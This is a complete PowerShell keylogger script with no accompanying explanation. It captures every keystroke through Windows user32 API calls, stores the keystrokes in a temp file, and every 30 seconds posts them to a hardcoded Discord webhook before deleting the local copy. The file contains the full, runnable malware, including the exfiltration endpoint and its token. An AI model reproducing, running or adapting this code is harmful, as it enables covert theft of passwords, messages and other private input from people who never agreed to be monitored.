
$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"


$keylogFilePath = "$env:temp\keylogs.txt"


$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@


$API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru


function Send-DiscordMessage {
    param (
        [string]$Content
    )

    try {
        $body = @{
            content = $Content
        } | ConvertTo-Json

        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
    }
    catch {
        Write-Host "Error occurred: $_"
    }
}


function LogKeystrokesToFile {
    param (
        [string]$Content
    )

    try {
        Add-Content -Path $keylogFilePath -Value $Content -Encoding UTF8
    }
    catch {
        Write-Host "Error occurred: $_"
    }
}


function SendKeylogsFromFile {
    try {
        
        $keylogs = Get-Content -Path $keylogFilePath -Raw
        
        
        Send-DiscordMessage -Content $keylogs
        
        
        Remove-Item -Path $keylogFilePath -Force
    }
    catch {
        Write-Host "Error occurred: $_"
    }
}


function KeyLogger {
    $buffer = ""
    while ($true) {
        Start-Sleep -Milliseconds 40

        for ($ascii = 9; $ascii -le 254; $ascii++) {
            
            $keystate = $API::GetAsyncKeyState($ascii)

            
            if ($keystate -eq -32767) {
                $null = [console]::CapsLock

                
                $mapKey = $API::MapVirtualKey($ascii, 3)

                
                $keyboardState = New-Object Byte[] 256
                $hideKeyboardState = $API::GetKeyboardState($keyboardState)
                $loggedchar = New-Object -TypeName System.Text.StringBuilder

                
                if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                    $buffer += $loggedchar
                }
            }
        }
        
        
        if ($buffer -match '\s+$') {
            
            LogKeystrokesToFile -Content $buffer.Trim()
            $buffer = ""  
        }
        
        
        if ((Get-Date) -ge $sendTime) {
            SendKeylogsFromFile
            $sendTime = (Get-Date).AddSeconds(30)  
        }
    }
}


$sendTime = (Get-Date).AddSeconds(30)


KeyLogger
